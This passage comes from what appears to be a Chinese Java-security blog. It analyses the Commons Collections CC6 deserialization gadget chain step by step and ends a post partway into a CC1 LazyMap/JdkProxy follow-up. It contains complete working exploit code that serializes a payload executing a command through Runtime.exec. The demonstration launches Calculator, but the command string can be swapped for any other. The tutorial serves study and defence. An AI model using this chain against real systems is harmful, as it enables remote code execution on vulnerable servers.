class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">  <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>TiedMapEntry</code>中的 <code>this.map</code>可以赋值为<code>LazyMap</code>，之后我们只需要调用 <code>TiedMapEntry</code>的 <code>hashCode</code>函数， <code>hashCode</code>函数中会调用 <code>getValue</code>函数，从而调用 <code>map.get</code>，那么 <code>LazyMap</code>在调用 <code>get</code>时就能触发 <code>Transformer</code>的 <code>transform</code>函数。</p>
<p>LazyMap的触发机制可以参考: <a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MzkyNDM4MzQ3MA==&mid=2247483766&idx=1&sn=5aeb9558ce83133b937142140a684507&chksm=c1d7e0f7f6a069e1c105952012d44fd4d2a2b7c3ad8050a986b2e2d2f722b83bb05bfe56b8cd&scene=21#wechat_redirect">Java安全-CC1链LazyMap分析</a></p>
<p>那么我们要怎么样能调用到 <code>TiedMapEntry</code>的 <code>hashCode</code>呢？</p>
<p>实际上我们回想一下<a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MzkyNDM4MzQ3MA==&mid=2247483729&idx=1&sn=669c8939e36dd40e8491d09453f2cf4f&chksm=c1d7e0d0f6a069c6f6db291086b7ef6cd8bc77944fb9c450192b1cae80cd1f6a6aa007f76207&scene=21#wechat_redirect">URLDNS反序列化探测</a>，是不是只需要将 <code>TiedMapEntry</code>存到 <code>HashMap</code>的 <code>key</code>上就能调用到 <code>hashCode</code>了呢？答案是肯定的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> input -&gt; &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;123123&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), transformer);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">expMap.put(tiedMapEntry, <span class="string">&quot;valuevalue&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%86%E6%9E%90/640.png" alt="图片"></p>
<p>之后其实和<a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MzkyNDM4MzQ3MA==&mid=2247483729&idx=1&sn=669c8939e36dd40e8491d09453f2cf4f&chksm=c1d7e0d0f6a069c6f6db291086b7ef6cd8bc77944fb9c450192b1cae80cd1f6a6aa007f76207&scene=21#wechat_redirect">URLDNS反序列化探测</a>是类似的，不过有些地方有需要注意的点，所以这里分析一下。</p>
<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><ol>
<li>首先<code>tiedMapEntry</code>被存入<code>HashMap</code>中，然后将<code>HashMap</code>序列化，发送到目标服务器，目标服务器进行反序列化，会调用<code>HashMap</code>的<code>readObject</code>进行还原。下边这张图是<code>HashMap</code>的<code>readObject</code>函数。</li>
</ol>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%86%E6%9E%90/640-20230109222430222.png" alt="图片"></p>
<ol start="2">
<li>跟进<code>HashMap#hash</code>函数，这个<code>hash</code>函数进行非空判断后调用变量<code>key</code>的<code>hashCode</code>，这个<code>key</code>实际上就是<code>TiedMapEntry</code>，那这里就是相当于是调用<code>TiedMapEntry</code>的<code>hashCode</code>。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">  <span class="type">int</span> h;</span><br><span class="line">  <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>跟进到<code>TiedMapEntry</code>的<code>hashCode</code>函数，这里调用了<code>getValue</code>函数。那其实这里就回到我们上边讲的情况了。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">  <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">    (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>继续跟进到<code>getValue</code>函数，这里调用到<code>map.get</code>，那么这个<code>map</code>是哪里来的呢它又是什么？</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>这个<code>map</code>实际上就是<code>TiedMapEntry</code>的构造函数里传进来的，那么我们只需要将<code>map</code>赋为<code>LazyMap</code>即可(前边的TiedMapEntry分析那里的代码其实就是赋值为<code>LazyMap</code>)，这样<code>LazyMap</code>只要有调用<code>get</code>函数就能触发<code>Transformer</code>的 <code>transform</code>函数。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">  <span class="built_in">super</span>();</span><br><span class="line">  <span class="built_in">this</span>.map = map;</span><br><span class="line">  <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有了上边的分析后，来构造Exp。</p>
<h1 id="Exp构造"><a href="#Exp构造" class="headerlink" title="Exp构造"></a>Exp构造</h1><p>如果这里Exp构造看不懂的话，证明还没有对<code>CC1</code>链的利用理解透彻，建议先看看<code>CC1</code>链的分析。</p>
<p><a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MzkyNDM4MzQ3MA==&mid=2247483753&idx=1&sn=07db823828c7cca2996d690b75f1e686&chksm=c1d7e0e8f6a069febc5635e25674d68cd647a16a108f6b011b5b85778bbe73b16c0cda77f034&scene=21#wechat_redirect">Java安全-CC1链TransformedMap分析</a></p>
<p><a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MzkyNDM4MzQ3MA==&mid=2247483766&idx=1&sn=5aeb9558ce83133b937142140a684507&chksm=c1d7e0f7f6a069e1c105952012d44fd4d2a2b7c3ad8050a986b2e2d2f722b83bb05bfe56b8cd&scene=21#wechat_redirect">Java安全-CC1链LazyMap分析</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">            <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">            <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">            <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), transformerChain);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">expMap.put(tiedMapEntry, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(expMap);</span><br><span class="line">oos.close();</span><br><span class="line"></span><br><span class="line">System.out.println(barr);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">ois.readObject();</span><br></pre></td></tr></table></figure>

<p>但是执行后会发现并没有弹出计算器，也就是我们的rce没有生效。那么是不是意味着<code>LazyMap</code>的<code>get</code>函数并没有被执行？我们在<code>LazyMap</code>的<code>get</code>函数上打个断点，看下是否进入到该函数的逻辑中。</p>
<p>打了断点后呢发现，<code>LazyMap</code>的<code>get</code>函数被调用了两次。</p>
<ol>
<li>第一次进到了<code>if</code>判断内</li>
</ol>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%86%E6%9E%90/640-20230109222555236.png" alt="图片"></p>
<ol start="2">
<li>第二次没有进到<code>if</code>内</li>
</ol>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%86%E6%9E%90/640-20230109222604213.png" alt="图片"></p>
<p>那么为什么会调用两次？第一次进入到if内代表当时<code>map</code>里没有一个<code>key</code>叫<code>keykey</code>，而第二次进入<code>if</code>内代表<code>map</code>里有一个<code>key</code>叫<code>keykey</code>。</p>
<p>其实这里观察第一次的<code>if</code>就会发现，<code>if</code>体内有一段代码<code>map.put(key, value);</code>，也就是说如果变量<code>map</code>中不存在键值是变量<code>key</code>时就会将<code>key</code>存入。好吧这里有点废话，其实就是<code>map.containsKey(key) == false</code>。<code>![图片](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/Expression/Expression_14@2x.png?wxfrom=5&amp;wx_lazy=1&amp;wx_co=1)</code></p>
<p>所以第二次的<code>if</code>不会进入就是因为第一次的<code>if</code>往<code>map</code>里<code>put</code>了<code>keykey</code>这个键(上图中显示的<code>key: &quot;keykey&quot;</code>)。</p>
<p>那么第一次if是怎么触发的呢？为什么会触发两次？</p>
<p>回看一下前边一大段的<code>Exp</code>代码，首先我们注意到，<code>TiedMapEntry</code>的构造函数里是有接收一个<code>keykey</code>的字符串。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;keykey&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>但是构造函数里并没有什么，只是将<code>key</code>赋值给了成员属性<code>this.key</code>，我们接着往下看代码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">  <span class="built_in">super</span>();</span><br><span class="line">  <span class="built_in">this</span>.map = map;</span><br><span class="line">  <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们注意<code>Exp</code>代码中的这个<code>put</code>动作，这是<code>HashMap</code>里的<code>put</code>函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">expMap.put(tiedMapEntry, <span class="string">&quot;valuevalue&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>看看<code>HashMap</code>里的<code>put</code>，它将<code>key</code>传给了<code>hash</code>函数，这个<code>key</code>是我们前边的<code>tiedMapEntry</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进看<code>hash</code>函数，这里又绕回到了调用<code>TiedMapEntry</code>的<code>hashCode</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">  <span class="type">int</span> h;</span><br><span class="line">  <span class="comment">// 这里的key就是tiedMapEntry</span></span><br><span class="line">  <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>TiedMapEntry</code>的<code>hashCode</code>又调用了&#96;getValue</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">  <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">    (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getValue</code>里呢又调用了<code>map</code>的<code>get</code>，<code>map</code>就是<code>LazyMap</code>。而传进去的<code>key</code>其实就是<code>TiedMapEntry</code>的构造函数时的<code>this.key</code>也就是<code>keykey</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// 这里map是lazyMap</span></span><br><span class="line">  <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以这里导致在生成<code>exp</code>的时候就已经触发了一次<code>LazyMap</code>的<code>get</code>函数，而<code>LazyMap</code>里的<code>get</code>就刚好有这个<code>map.put</code>的动作，所以将<code>keykey</code>存入<code>map</code>中了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">  <span class="comment">// 这一次调用LazyMap里的map是没有这个key的，所以会进入if。</span></span><br><span class="line">  <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">    <span class="comment">// 他将这个key存入map中了。</span></span><br><span class="line">    map.put(key, value);</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么当我们生成好<code>exp</code>之后呢，发送到目标服务器时，目标服务器进行<code>readObject</code>后呢，还原的数据里，也就是<code>LazyMap</code>里的那个<code>this.map</code>实际上是已经带有一个键是<code>keykey</code>的键值对存在的。所以会造成，在目标服务器上没法触发<code>rce</code>，因为那个<code>if</code>判断他无法进入，也就无法触发<code>transform</code>。</p>
<p>那么解决办法就是，在<code>expMap.put(tme, &quot;valuevalue&quot;);</code>之后将<code>LazyMap</code>中<code>key</code>为<code>keykey</code>的键值对删除，这样在序列化出来的数据里的<code>LazyMap</code>就不会有一个键是<code>keykey</code>的元素。完整的利用如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">            <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">            <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">            <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), transformerChain);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">expMap.put(tiedMapEntry, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">lazyMap.remove(<span class="string">&quot;keykey&quot;</span>); <span class="comment">// 删除keykey</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 防止二次触发payload</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(expMap);</span><br><span class="line">oos.close();</span><br><span class="line"></span><br><span class="line">System.out.println(barr);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">ois.readObject();</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%86%E6%9E%90/640-20230109222759380.png" alt="图片"></p>

      
	</div>

<div class="meta">
	
</div>
</article>

  <article class="post">
	<h2 class="title">
		<a href="2022/11/04/Java安全-CC1链LazyMap分析/">Java安全-CC1链LazyMap分析</a>
	</h2>
    <div class="entry-content">
    <div class="meta">
      <div class="date">发布时间: <time datetime="2022-11-03T16:24:48.000Z" itemprop="datePublished">2022-24-4</time>
</div>
      <div class="tags">标签: 

<a href="/tags/Java安全/">Java安全</a>
</div>
    </div>
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章是建立在<a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MzkyNDM4MzQ3MA==&mid=2247483753&idx=1&sn=07db823828c7cca2996d690b75f1e686&chksm=c1d7e0e8f6a069febc5635e25674d68cd647a16a108f6b011b5b85778bbe73b16c0cda77f034&scene=21#wechat_redirect">《Java安全-CC1链TransformedMap分析》</a>分析上，讲解LazyMap的利用分析。</p>
<p>严格来说ysoserial-CC1利用链用到的是LazyMap而不是TransformedMap，在源码上可以看到。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BELazyMap%E5%88%86%E6%9E%90/640.png" alt="Image"></p>
<h1 id="JdkProxy"><a href="#JdkProxy" class="headerlink" title="JdkProxy"></a>JdkProxy</h1><p>在正式进入LazyMap的分析前，需要先介绍一下JdkProxy，后续会用到，JdkProxy指的是java.lang.reflect.Proxy这个类。</p>
<p>Java里的代理主要是用来实现像AOP的功能，有点像Hook的效果。<strong>这里大家打开IDEA跟着操作，操作下来就能明白JdkProxy的用处了。</strong></p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BELazyMap%E5%88%86%E6%9E%90/640-20221104002614548.png" alt="Image"></p>
<p>这里我们先使用JdkProxy的Api来创建一个proxyMap(其实这个Map就是代理实例)，newProxyInstance的第三个参数需要一个InvocationHandler的实现(这里我们就先正常实现一个就可以了)。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 通过JdkProxy的Api来获取Map</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">      Map.class.getClassLoader(),</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,</span><br><span class="line">      <span class="comment">// 这里我相当于是对HashMap进行一个代理</span></span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">DemoInvocationHandler</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;())</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>之后我们定义一个InvocationHandler的实现类(DemoInvocationHandler)。</p>
